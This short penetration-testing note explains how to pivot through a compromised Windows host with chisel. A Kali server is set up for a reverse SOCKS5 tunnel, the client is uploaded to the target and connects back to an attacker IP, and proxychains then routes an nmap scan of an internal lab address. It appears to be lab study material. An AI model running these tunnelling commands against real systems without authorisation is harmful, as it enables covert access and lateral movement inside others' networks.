download chisel on https://github.com/jpillora/chisel/releases 

download **[chisel_1.7.7_linux_amd64.gz](https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz) for kali and [chisel_1.7.7_windows_amd64.gz](https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_windows_amd64.gz) for target windows.**

prepare chisel server on kali : 

```bash
chmod +x chisel
```

open server on kali : 

```bash
./chisel server -p <Local_Attacker_Port> --socks5 --reverse
```

![image](https://user-images.githubusercontent.com/55615071/189031440-23102649-c833-4ace-a1a0-10f33dc3388e.png)


upload chisel.exe to windows target and run following command.

```bash
chisel.exe client <attacker_IP>:<Local_listening_port> R:socks &
```

![image](https://user-images.githubusercontent.com/55615071/189031515-c4c54896-bd04-40c0-bc7b-43dc82c63afb.png)


Remind : & on command is meaning run chisel on background

After run chisel client, check state connect on chisel server. it should be like this

![image](https://user-images.githubusercontent.com/55615071/189031556-d2728e7c-db24-4c89-8c04-bbe52aa36687.png)

try testing by use proxychains before command

![image](https://user-images.githubusercontent.com/55615071/189031576-396b1d6c-7d26-45c6-9793-1d876845a043.png)

proxychains nmap -sT -Pn -sV -sC -p1-6000 192.168.239.129

![image](https://user-images.githubusercontent.com/55615071/189031936-dd2bbdcb-284d-4d58-abd8-e2cb0d3ddb9d.png)


